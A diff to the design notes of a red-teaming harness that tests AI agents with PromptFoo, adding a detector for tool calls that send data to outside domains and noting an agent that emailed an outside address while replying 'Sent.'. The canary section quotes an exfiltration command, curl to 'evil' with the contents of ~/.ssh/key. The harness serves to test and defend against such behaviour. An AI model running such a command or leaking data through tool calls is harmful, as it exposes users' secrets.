@@ -65,10 +65,12 @@ of agent needs a new context file, not new code.
 
 ## Deterministic checks
 
-**Detectors** (`detectors/core.py`). `external_link`, `external_email`, `forbidden_tool_used`, `arg_out_of_bounds`,
+**Detectors** (`detectors/core.py`). `external_link`, `external_email`, `forbidden_tool_used`, `arg_out_of_bounds`, `arg_outside_domains`,
 `attempts_over_allowance`, `runaway_output`, `tool_loop`. All of them run on every test; each is inert unless the context configures the
 thing it checks, so there is no selection step to get wrong. They are trustworthy as proof because each reads a structured field
-(a tool name, an argument, a count) against a bound, never a regex over free text.
+(a tool name, an argument, a count) against a bound, never a regex over free text. `external_link` and `external_email` read the *reply*;
+`arg_outside_domains` reads the *tool call* (`send_email.to`, `http_post.url`), which is where data actually leaves. A fresh-install run showed
+the difference: an agent that emailed an outside address and replied "Sent." passed the reply checks.
 
 **Canary oracle** (`canary.py`). The generic detectors see a tool's *name*; to them `bash` is `bash` whether it ran `ls` or
 `curl evil?d=$(cat ~/.ssh/key)`. For agents with shell, code or file tools, `CanaryFixture` plants fake secrets and files (a victim
@@ -129,7 +131,8 @@ They test the *test*, not the agent; each was written after observing the failur
   (parsed from PromptFoo's own source).
 - **`promptfoo_redteam_config.py`** builds `promptfooconfig.yaml` (target, plugins, strategies, `defaultTest.assert` wired to the bridge
   and, for shell agents, the canary), estimates the real test count with PromptFoo's formula, and builds the commands:
-  `redteam_generate_args`, `redteam_eval_args` (`-j 1`), `redteam_run_args`, `view_command`. Adaptive strategies send the agent's
+  `redteam_generate_args`, `redteam_eval_args` (`-j 1`), `redteam_run_args`, `view_command`, plus `build_handwritten_config` (Path B) and
+  `run_env_block` (the `export` lines every command needs). Adaptive strategies send the agent's
   replies to PromptFoo's servers, so these helpers refuse them without explicit approval.
 - **Plugin selection stays the assistant's judgment**, guided by `references/promptfoo-plugins-strategies.md`, because mapping arbitrary
   agent code to the right plugins needs comprehension and a keyword heuristic would reintroduce false confidence.
@@ -178,7 +181,7 @@ is no generic "this argument must equal what an earlier tool returned" detector 
 ## Status
 
 Done: the core checks, the canary oracle, proof against planted flaws (including HTTP and RAG/memory variants), PromptFoo auto-setup,
-the provider-aware meter with key handling, real runs against live APIs on three third-party agents, CI on Python 3.10, 3.12 and 3.14,
+the provider-aware meter with key handling, real runs against live APIs on three third-party agents, CI (lint, tests on Python 3.10, 3.12 and 3.14, mutation check, demos),
 and a protected `main`. Open: the evidence is small (a few agents, one repeat each, one target model), the Anthropic usage parsing is
-unit-tested only, the generate-then-plant flow and the shortened `SKILL.md` have not been run end to end on a fresh install, nothing
-derives the test count from the budget, and there is no release yet.
+unit-tested only, nothing derives the test count from the budget, a fresh-install run has covered a scripted agent only (not yet a shell/code agent through the
+shortened `SKILL.md` with plant-and-evaluate), and there is no release yet.
